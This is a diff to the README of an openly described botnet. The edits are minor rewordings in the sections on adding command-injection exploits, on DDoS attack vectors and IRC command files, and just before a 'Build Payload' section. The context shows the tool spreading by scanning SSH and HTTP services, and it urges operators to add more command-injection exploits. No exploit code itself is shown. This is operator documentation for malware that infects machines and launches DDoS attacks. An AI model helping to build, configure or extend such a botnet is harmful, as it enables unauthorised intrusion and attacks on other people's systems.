@@ -58,7 +58,7 @@ The spread feature will scan on the default SSH and HTTP (vulnerabilities). Opti
 	4) Done... Just save it.
 	
 # Add/Customize Exploit
-The exploit that's used in this botnet mostly will be a command injection (TBH it's all of it LMAO). You can add more new exploits if you want, but I recommend it to be a command injection vulnerability because you don't need to add or write anything more you just need to config it. I try to make the exploit feature easy and flexible to the configuration as much as I can. If 2 examples down below is not enough you can see more example in "internal/exploit.go".
+The exploit that's used in this botnet mostly will be a command injection (TBH it's all of it LMAO). You can add more new exploits if you want, but I recommend it to be a command injection vulnerability because you don't need to add or write anything more you just need to config it. I try to make the exploit feature easy and flexible to the configuration as much as I can. If two examples down below is not enough you can see more example in "internal/exploit.go".
 
 	################################################################
 	### Example 1 In case that you want to add a new HTTP header ###
@@ -138,7 +138,7 @@ All of the attack vectors except "HTTP" DDoS vectors will be random source ports
 	
 	cat irc/commands.txt 
 	
-	# I have moved IRC commands from GitHub repositories to the commands.txt file.
+	# I have moved IRC commands from GitHub repositories to the file name commands.txt in irc folder.
 
 # Build Payload
 
